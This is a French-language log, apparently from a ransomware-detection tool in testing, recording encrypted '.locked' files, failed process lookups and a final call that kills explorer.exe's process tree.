+2025-07-24 23:08:12.213Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (24).bmp.locked
+2025-07-24 23:08:12.213Z [DEBUG] ProcessId détecté : 9916
+2025-07-24 23:08:12.213Z [WARN] Processus PID 9916 non trouvé
+2025-07-24 23:08:12.213Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (25).bmp.locked'
+2025-07-24 23:08:12.228Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (25).bmp.locked
+2025-07-24 23:08:12.229Z [DEBUG] ProcessId détecté : 11024
+2025-07-24 23:08:12.229Z [WARN] Processus PID 11024 non trouvé
+2025-07-24 23:08:12.229Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (3).bmp.locked'
+2025-07-24 23:08:12.229Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (3).bmp.locked
+2025-07-24 23:08:12.229Z [DEBUG] ProcessId détecté : 4312
+2025-07-24 23:08:12.244Z [WARN] Processus PID 4312 non trouvé
+2025-07-24 23:08:12.244Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (4).bmp.locked'
+2025-07-24 23:08:12.244Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (4).bmp.locked
+2025-07-24 23:08:12.244Z [DEBUG] ProcessId détecté : 6396
+2025-07-24 23:08:12.260Z [WARN] Processus PID 6396 non trouvé
+2025-07-24 23:08:12.260Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (5).bmp.locked'
+2025-07-24 23:08:12.260Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (5).bmp.locked
+2025-07-24 23:08:12.260Z [DEBUG] ProcessId détecté : 3844
+2025-07-24 23:08:12.278Z [WARN] Processus PID 3844 non trouvé
+2025-07-24 23:08:12.291Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (6).bmp.locked'
+2025-07-24 23:08:12.291Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (6).bmp.locked
+2025-07-24 23:08:12.291Z [DEBUG] ProcessId détecté : 10968
+2025-07-24 23:08:12.291Z [WARN] Processus PID 10968 non trouvé
+2025-07-24 23:08:12.291Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (7).bmp.locked'
+2025-07-24 23:08:12.291Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (7).bmp.locked
+2025-07-24 23:08:12.291Z [DEBUG] ProcessId détecté : 3384
+2025-07-24 23:08:12.307Z [WARN] Processus PID 3384 non trouvé
+2025-07-24 23:08:12.307Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (8).bmp.locked'
+2025-07-24 23:08:12.307Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (8).bmp.locked
+2025-07-24 23:08:12.307Z [DEBUG] ProcessId détecté : 1584
+2025-07-24 23:08:12.322Z [WARN] Processus PID 1584 non trouvé
+2025-07-24 23:08:12.322Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (9).bmp.locked'
+2025-07-24 23:08:12.322Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (9).bmp.locked
+2025-07-24 23:08:12.322Z [DEBUG] ProcessId détecté : 11152
+2025-07-24 23:08:12.338Z [WARN] Processus PID 11152 non trouvé
+2025-07-24 23:08:12.338Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie.bmp.locked'
+2025-07-24 23:08:12.369Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie.bmp.locked
+2025-07-24 23:08:12.369Z [DEBUG] ProcessId détecté : 6396
+2025-07-24 23:08:12.385Z [WARN] Processus PID 6396 non trouvé
+2025-07-24 23:08:12.401Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap.bmp.locked'
+2025-07-24 23:08:12.401Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap.bmp.locked
+2025-07-24 23:08:12.416Z [DEBUG] ProcessId détecté : 4312
+2025-07-24 23:08:12.416Z [WARN] Processus PID 4312 non trouvé
+2025-07-24 23:08:12.432Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 23:08:12.432Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 23:08:12.432Z [DEBUG] ProcessId détecté : 4552
+2025-07-24 23:08:12.432Z [WARN] Processus PID 4552 non trouvé
+2025-07-24 23:08:12.447Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 23:08:12.447Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 23:08:12.447Z [DEBUG] ProcessId détecté : 9916
+2025-07-24 23:08:12.467Z [WARN] Processus PID 9916 non trouvé
+2025-07-24 23:08:12.467Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 23:08:12.479Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 23:08:12.479Z [DEBUG] ProcessId détecté : 10968
+2025-07-24 23:08:12.479Z [WARN] Processus PID 10968 non trouvé
+2025-07-24 23:08:12.479Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 23:08:12.479Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 23:08:12.479Z [DEBUG] ProcessId détecté : 11024
+2025-07-24 23:08:12.494Z [WARN] Processus PID 11024 non trouvé
+2025-07-24 23:08:12.494Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 23:08:12.494Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 23:08:12.513Z [DEBUG] ProcessId détecté : 10968
+2025-07-24 23:08:12.513Z [WARN] Processus PID 10968 non trouvé
+2025-07-24 23:08:12.525Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 23:08:12.525Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 23:08:12.525Z [DEBUG] ProcessId détecté : 11024
+2025-07-24 23:08:12.525Z [WARN] Processus PID 11024 non trouvé
+2025-07-24 23:08:12.525Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 23:08:12.525Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 23:08:12.525Z [DEBUG] ProcessId détecté : 4552
+2025-07-24 23:08:12.541Z [WARN] Processus PID 4552 non trouvé
+2025-07-24 23:08:49.213Z [DEBUG] Fichier cible détecté : 'c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$i7bza9x.locked'
+2025-07-24 23:08:49.259Z [🧨] Fichier chiffré détecté : c:\$recycle.bin\s-1-5-21-1349940229-2857808021-1114501214-1000\$i7bza9x.locked
+2025-07-24 23:08:49.269Z [DEBUG] ProcessId détecté : 4796
+2025-07-24 23:08:49.274Z [INFO] kill_process_tree appelé pour PID 4796 (explorer.exe)
